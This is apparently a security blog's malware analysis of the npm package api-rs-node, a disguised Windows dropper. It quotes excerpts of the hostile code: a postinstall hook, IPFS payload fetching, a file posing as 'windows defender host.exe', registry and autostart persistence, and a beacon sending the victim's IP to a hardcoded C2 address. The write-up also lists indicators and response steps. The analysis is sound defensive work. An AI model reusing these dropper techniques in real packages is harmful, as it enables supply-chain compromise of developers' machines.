---
title: "api-rs-node: a fake Rust bridge that doxxed its own author"
date: 2026-05-25
summary: "A 'high-performance Rust bridge' that's really a Windows dropper — IPFS payload, registry persistence, a beacon on port 2026 — whose author bundled their own config files and named the very machine they built it on."
packageName: api-rs-node
ecosystem: npm
---

`api-rs-node@4.3.1` sells itself as a "high-performance Rust bridge"; it is a 292-line Windows dropper wrapped in a polished README, and its tarball ships the author's own filesystem layout by accident. An earlier draft went out 5½ hours before as [`@devcarron/clob@2.73.0`](/discoveries/2026/05/devcarron-clob/) from a separate gmail — same author, same payload, proof in that post.

## Stage 1: `clob.js`

The README is a polished Rust-bridge marketing page down to a benchmark table, but its install line still reads `npm install your-package-name`; the `package.json` carries no author, no license, no keywords, and one `postinstall` script:

<pre class="lang-js"><code>{
  <span class="tok-str">"name"</span>: <span class="tok-str">"api-rs-node"</span>,
  <span class="tok-str">"version"</span>: <span class="tok-str">"4.3.1"</span>,
  <span class="tok-str">"description"</span>: <span class="tok-str">"High-performance Rust modules for Node.js with native speed and clean DX."</span>,
  <span class="tok-str">"scripts"</span>: { <span class="tok-str">"postinstall"</span>: <span class="tok-str">"node clob.js"</span> },
  <span class="tok-str">"main"</span>: <span class="tok-str">"clob.js"</span>
}
</code></pre>

`clob.js` is wired for Windows only; the mac and Linux URLs are still `null` with `TODO` comments:

<pre class="lang-js"><code><span class="tok-kw">const</span> WIN_CID   = <span class="tok-str">'bafybeif3zkapj364ofnrvbty7oj5h5ufpxlp4s62usk3ulxrru35e3gssa'</span>;
<span class="tok-kw">const</span> MAC_URL   = <span class="tok-kw">null</span>; <span class="tok-com">// TODO: set macOS binary URL</span>
<span class="tok-kw">const</span> LINUX_URL = <span class="tok-kw">null</span>; <span class="tok-com">// TODO: set Linux binary URL</span>
</code></pre>

It tries four IPFS gateways for `WIN_CID` in sequence, writes the result to `%LOCALAPPDATA%\windows defender host.exe`, registers persistence on all three platforms (the mac and Linux branches register and then bail with no payload), then POSTs the host's public IP — fetched from `api.ipify.org` — to a hardcoded IPv4 on a port that doubles as the year.

Gateways:

- `violet-tricky-quelea-562.mypinata.cloud` (private Pinata, optional `PINATA_GATEWAY_TOKEN`)
- `cloudflare-ipfs.com`
- `gateway.pinata.cloud`
- `ipfs.io`

Persistence:

- **Windows:** hidden VBS launcher (`oShell.Run "...exe", 0, False`) + `HKCU\…\Run`
- **macOS:** `~/Library/LaunchAgents/com.clob.agent.plist` with `RunAtLoad=true`
- **Linux:** `~/.config/autostart/clob.desktop`

<pre class="lang-js"><code><span class="tok-kw">const</span> reportPath = <span class="tok-tmpl">`/api/urls?url=<span class="tok-tmpl-expr">${encodeURIComponent(ip)}</span>`</span>;
<span class="tok-kw">const</span> options = {
  hostname: <span class="tok-str">'170.205.31.203'</span>,
  port: 2026,
  path: reportPath,
  method: <span class="tok-str">'POST'</span>,
};
</code></pre>

Standard hidden-spawn recipe, every failure path silent:

- Spawn options: `detached: true`, `stdio: 'ignore'`, `windowsHide: true`, `child.unref()`
- Failed download: silent `fs.unlink` on the partial file
- Timed-out install: `process.exit(0)` with no log
- Every catch block: `catch (_) {}`

## The leak

The tarball holds seven files, not two: a `config/` and `logs/` directory the code never references, leftover from the author's own file-explorer tool. `config/meta_data.json`:

<pre><code>{
  "version": "0.2.3",
  "abs_file_path_buf": "E:\\getting IP and check list\\clob-downloader\\config\\meta_data.json",
  "abs_folder_path_buf_for_templates": "E:\\getting IP and check list\\clob-downloader\\config\\templates",
  "all_volumes_with_information": [
    { "mount_point": "C:\\", "size": 317725863936, "total_read_bytes": 423897711616, ... },
    { "volume_name": "Programs", "mount_point": "D:\\", ... },
    { "volume_name": "Data",     "mount_point": "E:\\", ... },
    { "volume_name": "Etc",      "mount_point": "F:\\", ... }
  ],
  "current_running_os": "windows",
  "current_cpu_architecture": "x86_64",
  "user_home_dir": "C:\\Users\\mist"
}
</code></pre>

Publishing from `E:\getting IP and check list\clob-downloader\` dragged the tool's bookkeeping along: the Windows username `mist`, the project's working name, a four-volume NTFS layout, and lifetime per-volume read/write byte totals — a careful dropper undone by careless packaging.

## Stage 2: what the CID serves

The CID resolves to a 4 MB Windows PE32+ with its PDB path intact — a complete Tauri-style desktop app, an Axum + Hyper + Tokio server fronting a React file-explorer UI whose own `config/` metadata is what leaked into the tarball.

| Field | Value |
| --- | --- |
| SHA-256 | [`300a7dea05c2a588757010ad314fa55cb8ef3acebaa284f58a5cd0fd39bce478`](https://lab.atomdrift.org/file/300a7dea05c2a588757010ad314fa55cb8ef3acebaa284f58a5cd0fd39bce478) |
| PDB | `explr_server.pdb` |
| PDB GUID | `cd195463-cbd6-4917-a75d-49b312738bda` |
| Build timestamp | `2026-05-25T08:28:35Z` (nine hours before the tarball) |
| Toolchain | MSVC 14.44, no packer, full Rust crate paths in place |

Server surface:

| Field | Value |
| --- | --- |
| Startup banner | `Explr web server listening on http://…` |
| Routes | `/api/invoke` and `/api/download` |
| Auth | `Authorization: Bearer …` |
| Required env vars | `HOST`, `PORT`, `EXPLR_UI`, `AUTH_TOKEN` |
| Missing-config behaviour | errors `Invalid HOST/PORT` and exits before binding |

Remote-execution endpoints (4 of 53 `invoke` commands):

- `execute_command`
- `execute_command_improved`
- `execute_command_with_timeout`
- `request_full_disk_access`

Nothing in the binary indicates a stealer, and cleave's three hits are substring false positives off the React UI.

Stealer markers, all absent:

- Browser creds: `Login Data`, `Cookies.db`, `key3.db`, `Local State`, `logins.json`, `nss3.dll`
- Wallets / seeds: MetaMask, Phantom, Exodus, Atomic, Electrum, `wallet.dat`, mnemonic dictionaries
- Tokens: Discord, Telegram
- DPAPI: `CryptUnprotectData`

False positives:

- `credential-access/browser/dpapi` on `v11` — a UI version string, not the DPAPI marker
- `collection/file-targeting/filter` on `.seed` from a MIME table
- `exfiltration/stealer/file` on `FindFirstVolumeW`, used to populate the drive sidebar

Surviving traits — the Tauri surface itself:

|  | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot suspicious" title="suspicious"></span> | `command-and-control/backdoor/control/file-manager` | Tauri `*_sftp` + `execute_command*` exposed over HTTP |
| <span class="sev-dot suspicious" title="suspicious"></span> | `discovery/system/fingerprint/info` | `GetSystemInfo`, drive and volume enumeration |

## The campaign does not close the loop

As shipped, the chain between dropper and binary never connects, leaving the realistic victim population — a publicly addressable Windows host with all four env vars exported, nothing holding port 80, running `npm install` — approximately empty:

- **Windows-only.** The mac and Linux branches exit before downloading; their persistence code is written but unreachable.
- **No environment handoff.** Nothing propagates `HOST`, `PORT`, `EXPLR_UI`, or `AUTH_TOKEN`, so the server hits `Invalid HOST/PORT` and exits on every launch — persistence survives, the listener does not.
- **NAT assumption.** The beacon reports the host's *public* IP, which behind NAT belongs to the edge router, not the box that ran `npm install`; C2 has nothing to connect back to.

## Dropper traits

The [Fallout report](https://lab.atomdrift.org/file/75a602995eeebbeee9c0af1e6e83f2384d5426cb64af78f4475f261add329410) returns malicious at probability 1.0, clustering on IPFS delivery, stealth spawn, multi-platform persistence, and the Windows Defender masquerade:

|  | Trait | What it caught |
| --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/dropper/delivery/blockchain` | Four IPFS gateways fronting one CID |
| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/dropper/execution/persistence` | Download → Run key + LaunchAgents + XDG autostart |
| <span class="sev-dot hostile" title="hostile"></span> | `command-and-control/dropper/execution/stealth-spawn` | `detached:true` + `stdio:'ignore'` + `windowsHide:true` + `unref()` co-located |
| <span class="sev-dot hostile" title="hostile"></span> | `evasion/masquerade/identity/fabricated` | Drops as `windows defender host.exe` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `command-and-control/channel/http-beacon` | `POST /api/urls?url=<ip>` to `170.205.31.203:2026` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `command-and-control/infrastructure/ip-port` | Hardcoded IPv4 endpoint, no DNS |
| <span class="sev-dot suspicious" title="suspicious"></span> | `evasion/self-delete/file/script` | `fs.unlink(dest, () => {})` on every failure path |
| <span class="sev-dot suspicious" title="suspicious"></span> | `evasion/masquerade/identity/user-agent` | Chrome 124 UA in dropper requests |
| <span class="sev-dot suspicious" title="suspicious"></span> | `persistence/system/launchd/core` | LaunchAgents plist with `RunAtLoad` |
| <span class="sev-dot suspicious" title="suspicious"></span> | `persistence/system/init/boot` | `~/.config/autostart/clob.desktop` |
| <span class="sev-dot notable" title="notable"></span> | `persistence/login/registry/autostart` | `HKCU\…\Run` with VBS launcher |

## Likely actor

Two `api-rs-node` versions went out ninety minutes apart from one fresh gmail, and the byte-identical `meta_data.json` ties them to the [`@devcarron/clob`](/discoveries/2026/05/devcarron-clob/) sibling published 5½ hours earlier from a different gmail — same Windows machine, same `mist` user, novice OPSEC paired with rising craftsmanship.

| Field | Value |
| --- | --- |
| Publisher | `shinydv412 <shinydv412@gmail.com>` |
| `4.3.0` published | `2026-05-25T17:36:29Z` |
| `4.3.1` published | `2026-05-25T19:05:48Z` |
| Files in tarball | 7 (`clob.js`, `package.json`, `README.md`, `config/×2`, `logs/×2`) |
| Sibling publisher | `devcarron <devcarron@gmail.com>` (`@devcarron/clob@2.73.0`, `2026-05-25T11:59:04Z`) |
| Author host (from bundled `meta_data.json`) | Windows x86_64, username `mist`, project dir `E:\getting IP and check list\clob-downloader` |

## Indicators

| Type | Value |
| --- | --- |
| Package | `api-rs-node@4.3.1` (npm), also `4.3.0` |
| npm page | [npmjs.com/package/api-rs-node](https://www.npmjs.com/package/api-rs-node) |
| Tarball SHA-256 | [`75a602995eeebbeee9c0af1e6e83f2384d5426cb64af78f4475f261add329410`](https://lab.atomdrift.org/file/75a602995eeebbeee9c0af1e6e83f2384d5426cb64af78f4475f261add329410) |
| `clob.js` SHA-256 | [`5839ea1afa6dc1237da3a9c59668b1e4e21e5dde2d2827daecf43a83400a7023`](https://lab.atomdrift.org/file/5839ea1afa6dc1237da3a9c59668b1e4e21e5dde2d2827daecf43a83400a7023) |
| `package.json` SHA-256 | [`00ec02844d57931db3abb8011ecc9aba3fa7165c701c7a60065e1d63abe53c44`](https://lab.atomdrift.org/file/00ec02844d57931db3abb8011ecc9aba3fa7165c701c7a60065e1d63abe53c44) |
| C2 endpoint | `170.205.31.203:2026` (HTTP `POST /api/urls?url=<public-ip>:80`) |
| IPFS payload CID | `bafybeif3zkapj364ofnrvbty7oj5h5ufpxlp4s62usk3ulxrru35e3gssa` |
| Private gateway | `violet-tricky-quelea-562.mypinata.cloud` |
| Public-IP lookup | `api.ipify.org` |
| Dropped Windows file | `%LOCALAPPDATA%\windows defender host.exe` |
| Run key | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\clob` |
| Windows launcher | `%LOCALAPPDATA%\windows defender host-launcher.vbs` |
| macOS plist | `~/Library/LaunchAgents/com.clob.agent.plist` |
| Linux autostart | `~/.config/autostart/clob.desktop` |
| Publisher | `shinydv412 <shinydv412@gmail.com>` |

## Response

- Hunt npm caches, CI logs, and `%LOCALAPPDATA%` (plus the mac/Linux paths above) for the dropped filenames.
- In egress telemetry: outbound to `170.205.31.203:2026`, to `api.ipify.org`, and to the four gateways above carrying that CID.
- Rotate credentials reachable by any user that ran `npm install` on a Windows host that resolved `api-rs-node` since 2026-05-25.
- Treat the CID binary as untrusted; pull it for analysis from a throwaway identity.
